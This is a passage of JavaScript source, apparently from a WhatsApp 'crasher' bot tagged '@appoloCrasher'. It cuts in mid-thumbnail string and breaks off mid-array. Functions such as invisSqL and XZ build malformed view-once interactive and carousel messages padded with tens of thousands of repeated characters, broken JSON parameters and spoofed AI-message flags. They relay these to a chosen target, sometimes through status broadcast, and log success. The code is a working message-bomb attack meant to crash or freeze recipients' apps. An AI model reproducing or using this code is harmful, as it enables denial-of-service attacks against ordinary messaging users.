tbv8Ax1qum2rqIoclGEXOQVznt03VNrjjHmtzM37oOt/qDSuzAy7UyeihQOPxBrEM1umszrbho7ec70yckMPlY8e45+v1rdkt2OTI2ONzE/mSf51z9xbpcQK9uwWRT5kMg9f8D3+tNnWo7W3Rs2ut2egXUEklxGlxMDGJWORGCR82PYZ/Ej0rvdB+zfZpJUmW4D7QWcZ45x7968L1IJqV5GlwnkukY3qzYxyckHuK6fQb+50vTBFYXTeUTg55zg8flSORw9rWaR1fj/4eQeLNN8zS1W21KzJkhTP7uX1XHboOev4V4XafbHm8WG+haK8NsxmiK4Kt5i5GK+ntC1eHVrGOeN1Wf7zxq3KNmuX+IHgmPWLLUtW0+LytTltjDPsHEi5BBwOp4x+npTTJScZ2k/6tZHmnwx1prqxfSDAFW0QuJN3LbmPauW8QamYfEusQTx7o5na33jhgm9WOPXpx9a7r4eaPbW3hyPUYoW8+fcks3I3AMQODVHxLqWna3aXtnd2sUE9hK0UdzsHXKk4A5OQOnufWic7JHdXc/qdNOX9W2+46XUZ/Dc3h/RbVLI6c+mTQ3EbCMbnQ8YLcg5z6nkVwXjnS4tEjSKziMMS3fmLwWx8vBJPXPX8aQ3cF1ooVriRBbKsdnAzBi4Bwc+hrqtKvw7W2ja/arcxcKXH34wc4U5GGU4/wrGLUNEzy5VNXy7GNq3hm7trnWtdM0TW9xYSfKOGVioGP0rmfh9C134tscjKWqO/6H+prtddn8Qtaar9q04WuiyWsywgjLoQoIUn864rwfeSWniXRZGwEmDQ5AAyCSBn15xXRdNpo9GU6Mq9OdO9r3frc5pLmc2jWKH91LKrlcdWAIH8zXe3Mtn4e8Z6ZfXs/+iGySN3hUSlWVNrDGR/PvXnVFTc82NW0HH0+Vj3Dxf4zEfhNLzw1mJZjtd7placRnPzBQcKT68nntVb4Ua7JcXOt3U9hYDzFMs854kk77RkkBenQDkjJrxit7wj9pfXY4YZGSJ8NOF6MikMAfbcF/Si5aqKUkkvx69z1bxFqt5qOq3Gkwstus0I8xlH3I/7gHqeM+3HrWZoc85Sa0njCtbNs3Dof8/1qOyZ5vFN9I2flhAye/I5/nWsiqJJGVQCxG4jvxUvc78PT15l3ZgeI45RJE8JG5gQQ2MYHPf612PgGxt7rQnluVjnfzWT1AGB0/OuZ1+2FxbxKRnMu3rjqP8RWp4P1RdGhurOJfOj3Bx83Ruh/DijoZSTWJaXU1p1fQtbd7ORo8EOpznGR0PtXeaRrj6sbd4SiOu5biIjuRwR7HFecXNw93cPNKfmc/gKPD2uLoupXFzfZENqsjRv/AM9MDhfrkgUG9eMeT3iLxfrdro2pTposxuYogWmiWPPkknoWHGM/5NcJBcHVI7lLiz8+6uSWQqMGPuNvucE/QUz+0J5Lm8kZxF9pdpJgqbic8bfcD+fFVYb57SZLm1ujHksgcr88ZIG5vqQcZ/lWShZO3qeW5tpRvobNx4csrC4iWa5u7u4uIY5bCKyjC+YGz1Y527SB+dVLXUfOifSb6QKYCTBdB93lFc5BOfmHbPX9KsLrNy2kpbWJneazjljExTkW7dc9wR/SsfSrmKzkab7Gs67SrGcgIARz9D+NTHmabluS7X0OptZLnxTpBtm1B2azjkjPUkxMMZA74P6Vy91ZXGiRaC00AEsF3ISy8gqHUj8Oa3PAumLfahPcWOqwx3NujFEbKozY4UtjoemcV2/h+5ur3TTNf2kdrdCV0khQYCENit6TTk4o7cBQlXqcidtP1R8+UUUUzzwr0PwPpf2Sye+lXEs4G3PZO35n+QrltH0jzpYprmMurnENuOGnP9FHc16RbfuwYd6nyhmaQDC7sdB6AD+lNHXhoe9zMl024im1bUA3/LKOOMAdTySau6vJHHpx1COURSQgK8SqSCpOAfqCa5WHUhH4pRyQscwEQHsR8uffOPzre1ohNJmkMZkWPbIUB5YBgcVL3O2nLmpyaequYmuajK1iULiOZCsijaQTg5rE0vWb23ut4cMCpBB4HOKg1PUbjWJpJpAFijHyxlsYHoPU1paNHaXNjHbvMztKxBIjObfHc88j0+tF+h59Wq5VOZdDq9MubmW0a4vCmGOUCDjH9angtY9SeW3L9cyBCMFs9Np7EevrVRTiMI7M0cS9Au0lP7wA9OKfK8shgWMlr+FgsJQZ85T0pGtWs5xUUcRqtpcadfywvhYlG4NgjcOgJ7Adguc9epzUOmrDdTGKW4jtogCfMfGSx6cdccdgK9o0/wAD2mth7rX5FJgkLGGI7fKyoJBYfmcd/Ssubwx4blL3lnpUSwQzgGMluU/hY855wc0Wb2MY0ZNnlqXepaRYm8W2nWGQ7SyoQhyMYZsd/Sur0GHwlrvwxvm1yRbTUoZWaK5UgeXgZVVXPIOcY6n1ruPHdmz+G9cutMSFpltUn8h1yDbn5GZR0yhXHtgGvnCo5HLfTUzfu6GnpGv6joX2j+zpxEZ1CuxQE8dMZ6HmvWfh1PJceE1kldnkM8hZ2OSxJzk/nXidey/DBs+EyP7ty4/QVvTS5rnp5M/9pt5M8fCwZ5kfHsg/xrR0yymvrgR6fZeY/wDz0m5VffHT8816Trmg6TZ+FZdQt9NtkuvN27/LBAH0PH6VheHs3viXStNnZjZ3D4liUld4x0yMHHtUnmpJas1tH0CS3s57mK4WW6b9295ICct/cjHfH5Dv2FTQRRzO9nEc2Vqc3cmc+Y/URZ7k9W9Bx3rR+IV1NpPhgHT2FsTIIB5SgbY+flX+6Ppir8dlbWUdjZW8Kx26IxEY6Z2hsn1OTnJ61R2LR8n9f13PN/FsoXWo3jwsiruYqMYfOfzxius06/8A7Z0neYlbepSQZ4JxyBXF64N9rbzNzJKpkdu5YscmrXgueVL9olciNz8y9jxUMzoVrVX2ZhxwS3F2tqi7W37cMcbT712+kW9pZ23lwqTID+8JHLN7/wBB/jmvVj4f0e2tZbmLTLUThWfzDEGbdjrk15nr6Lb+KphCNgkhRmA6E4H5fhSu7mLhyli3sry4uoI7WKRiz4ilCkqueoJxjHeug1G1sfCPh8zkma8mYDzV4KgHnb6Dt+NZHg3ULpbNV83KvesrAqDkZxj8qoeJZ5b7xe9pcyNJbxSqiRk8KMZ/nTSuVGSjZ9TR07xBdSafNDa7o7OYjzGcYLt0wvtzye9XjqK6dp2pSk7oo0IYHvtP/wBbFZt4Ak+lxIAsZkOVHA4ZcVm6nK58Ca1IW+czSAn2MzVWx1SbV772O9vLyG3ufDcruGtrm4k02U9niuIuM/8AAkU181SKEkdQcgEgGvWfGN1PD8K/Dc8crLKJ4WDjqCITg15JSZxVvjYV3/gs+LF0R/7EWyNqZmz533t2Bn8OlcBXsfwv/wCRUf8A6+X/AJLVw3OzK6ftMRy3a0ex/9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  title: '@appoloCrasher • Since 2025 🩸',
                },
               footer: {
               text: "@appoloCrasher • Since 2025\n"
                 },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(100000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: target,             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await client.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  
console.log(chalk.green(`Successfully Sent ${chalk.red("CursorCrl")} to ${target}`));
}

async function invisSqL(X, ptcp = true) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "🩸⃟༑⌁⃰𝐱‌ཀ‌‌🦠",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
jpegThumbnail: "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",
              contextInfo: {
                mentionedJid: [X],
                participant: X,
                remoteJid: X,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "🩸⃟༑⌁⃰𝐱‌ཀ‌‌🦠"
          },
          nativeFlowMessage: {
            messageParamsJson: "X".repeat(10000)
          }
        }
      }
    }
  }, {});

  await client.relayMessage(X, msg.message, {
    participant: { jid: X },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function XZ(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Zyro Owner Xtry',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Zyro Owner Xtry"
                },
                footer: {
                  text: "Xtry.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Xtry.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await ror.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
/*
async function sianjg(target) {
  try {
    const message = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          stanzaId: "AppoloSike",
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: { text: 'X' },
            footer: { text: 'X' },
            carouselMessage: {
              cards: [
                {
                  header: {
                    text: "🩸 appolo sincê #2024",
                    imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                      fileLength: "164089",
                      height: 1,
                      width: 1,
                      mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                      fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                      directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1749172037",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                      scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                      scanLengths: [8596, 155493]
                    },
                    hasMediaAttachment: true
                  },
                  body: { text: "🩸 appolo sincê #2024" },
                  footer: { text: "🍁 Appolo Crasher #Since2025 🩸" },
                  nativeFlowMessage: {
                    messageParamsJson: '🩸Appolo #since2025',
                    buttons: [
                      { name: "report_issue", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "payment_info", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "redeem_code", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "shipping_info", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "rate_experience", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
                      { name: "help_center", buttonParamsJson: "🍁 Appolo Crasher #Since2025 🩸" },
